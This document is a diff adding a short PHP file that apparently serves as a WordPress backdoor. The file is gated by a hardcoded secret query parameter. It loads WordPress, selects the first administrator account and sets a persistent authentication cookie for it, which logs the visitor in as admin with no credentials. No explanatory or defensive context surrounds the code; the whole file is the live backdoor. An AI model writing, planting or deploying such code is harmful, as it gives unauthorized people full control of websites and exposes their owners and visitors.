@@ -1,0 +1,43 @@
+<?php
+$sec = "howl"; 
+if (!isset($_GET['love']) || $_GET['love'] !== $sec) {
+    header('HTTP/1.0 403 Forbidden');
+    die("Access Denied!");
+}
+
+$wp_load_path = $_SERVER['DOCUMENT_ROOT'] . '/wp-load.php';
+
+if (!file_exists($wp_load_path)) {
+    $wp_load_path = __DIR__ . '/wp-load.php';
+}
+
+if (!file_exists($wp_load_path)) {
+    $wp_load_path = dirname(__DIR__) . '/wp-load.php';
+}
+
+if (file_exists($wp_load_path)) {
+    require_once($wp_load_path);
+} else {
+    die("File wp-load.php not found.");
+}
+
+$admins = get_users(array(
+    'role' => 'administrator',
+    'number' => 1
+));
+
+if (!empty($admins)) {
+    $admin = $admins[0];
+    $user_id = $admin->ID;
+    
+    clean_user_cache($user_id);
+    wp_clear_auth_cookie();
+    wp_set_current_user($user_id);
+    wp_set_auth_cookie($user_id, true);
+    
+    wp_safe_redirect(admin_url());
+    exit;
+} else {
+    echo "No admin found.";
+}
+?>
